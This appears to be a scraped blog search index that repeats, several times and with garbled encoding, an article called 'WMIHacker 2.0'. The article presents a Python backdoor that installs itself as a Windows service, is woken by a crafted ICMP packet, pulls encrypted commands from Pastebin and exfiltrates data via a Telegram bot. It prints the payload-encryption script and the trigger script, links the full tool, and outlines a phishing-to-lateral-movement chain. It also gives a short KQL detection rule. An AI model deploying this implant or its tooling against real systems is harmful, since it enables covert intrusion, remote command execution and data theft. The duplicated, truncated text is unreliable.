This is just a Proof-of-Concept tool.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; 